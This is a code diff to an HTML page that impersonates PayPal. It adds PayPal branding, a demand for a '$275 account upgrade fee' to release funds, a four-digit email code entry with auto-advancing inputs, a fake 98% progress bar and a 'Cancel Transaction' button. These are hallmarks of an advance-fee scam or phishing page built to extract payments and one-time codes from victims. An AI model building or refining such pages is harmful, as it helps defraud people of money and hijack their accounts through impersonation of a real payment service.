@@ -39,6 +39,51 @@
         .progress-box.active {
             background-color: #0070ba;
         }
+        
+        /* Code input styling */
+        .code-input-container {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        
+        .code-input {
+            width: 50px;
+            height: 60px;
+            text-align: center;
+            font-size: 24px;
+            font-weight: bold;
+            border: 2px solid #d1d5db;
+            border-radius: 8px;
+            background-color: #f9fafb;
+            transition: all 0.2s ease;
+        }
+        
+        .code-input:focus {
+            border-color: #0070ba;
+            background-color: white;
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(0, 112, 186, 0.1);
+        }
+        
+        /* Animated progress bar */
+        .animated-progress {
+            height: 8px;
+            background: linear-gradient(90deg, #0070ba 0%, #0070ba 50%, transparent 50%, transparent 100%);
+            background-size: 200% 100%;
+            border-radius: 4px;
+            animation: loading 2s infinite linear;
+        }
+        
+        @keyframes loading {
+            0% {
+                background-position: 100% 0;
+            }
+            100% {
+                background-position: -100% 0;
+            }
+        }
     </style>
 </head>
 <body class="bg-gray-50 min-h-screen flex items-center justify-center p-4">
@@ -49,7 +94,7 @@
                 <div class="w-10 h-10 rounded-full bg-white flex items-center justify-center mr-3">
                     <i class="fab fa-paypal text-[#0070ba] text-xl"></i>
                 </div>
-                <h1 class="text-white text-xl font-bold"></h1>
+                <h1 class="text-white text-xl font-bold">PayPal</h1>
             </div>
         </div>
         
@@ -70,26 +115,26 @@
                 <div class="flex items-start">
                     <i class="fas fa-info-circle text-amber-500 mt-0.5 mr-2"></i>
                     <p class="text-amber-800">
-                        <span class="font-semibold">A $275 account upgrade fee is required before funds can be</span> released to the recipient PayPal balance.
+                        A <span class="font-semibold">$275 account upgrade fee</span> is required to finalize the release of the funds to your PayPal balance.
                     </p>
+                </div>
+            </div>
+            
+            <!-- Code Input Section -->
+            <div class="mb-6">
+                <p class="text-center text-gray-700 mb-3">Enter the 4-digit code sent to your email</p>
+                <div class="code-input-container">
+                    <input type="text" maxlength="1" class="code-input" id="digit1">
+                    <input type="text" maxlength="1" class="code-input" id="digit2">
+                    <input type="text" maxlength="1" class="code-input" id="digit3">
+                    <input type="text" maxlength="1" class="code-input" id="digit4">
                 </div>
             </div>
             
             <!-- Progress Bar -->
             <div class="mb-8">
-                <div class="progress-container">
-                    <div class="progress-box active" id="box1"></div>
-                    <div class="progress-box active" id="box2"></div>
-                    <div class="progress-box active" id="box3"></div>
-                    <div class="progress-box active" id="box4"></div>
-                    <div class="progress-box active" id="box5"></div>
-                    <div class="progress-box active" id="box6"></div>
-                    <div class="progress-box active" id="box7"></div>
-                    <div class="progress-box active" id="box8"></div>
-                    <div class="progress-box active" id="box9"></div>
-                    <div class="progress-box" id="box10"></div>
-                </div>
-                <p class="text-center text-gray-500 text-sm">Processing refund... (98%)</p>
+                <div class="animated-progress mb-2"></div>
+                <p class="text-center text-gray-500 text-sm">Processing transaction... (98%)</p>
             </div>
             
             <!-- Transaction Details -->
@@ -118,7 +163,7 @@
             <!-- Action Buttons -->
             <div class="space-y-3">
                 <button class="w-full bg-[#0070ba] hover:bg-[#005ea6] text-white font-medium py-3 px-4 rounded-lg transition duration-200">
-                    Try Again
+                    Cancel Transaction
                 </button>
 
             </div>
@@ -138,5 +183,37 @@
             </div>
         </div>
     </div>
+
+    <script>
+        // Auto-focus and navigation for code input fields
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.code-input');
+            
+            inputs.forEach((input, index) => {
+                // Focus on first input
+                if (index === 0) {
+                    input.focus();
+                }
+                
+                // Handle input
+                input.addEventListener('input', function(e) {
+                    if (this.value.length === 1) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    }
+                });
+                
+                // Handle backspace
+                input.addEventListener('keydown', function(e) {
+                    if (e.key === 'Backspace' && this.value.length === 0) {
+                        if (index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    }
+                });
+            });
+        });
+    </script>
 </body>
 </html>
